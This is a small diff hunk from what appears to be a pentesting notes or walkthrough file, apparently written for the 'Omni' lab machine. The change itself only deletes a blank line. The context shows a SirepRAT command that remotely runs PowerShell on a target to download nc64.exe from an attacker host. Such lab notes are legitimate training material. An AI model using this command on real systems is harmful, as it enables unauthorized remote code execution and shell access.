@@ -368,5 +368,4 @@ Used in ```Omni```
 
 ```
 python SirepRAT.py <target ip> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c     Powershell Invoke-WebRequest -OutFile C:\Data\Users\DefaultAccount\Documents\nc64.exe -Uri http://<attacker ip>/nc64.exe "
-
 ```
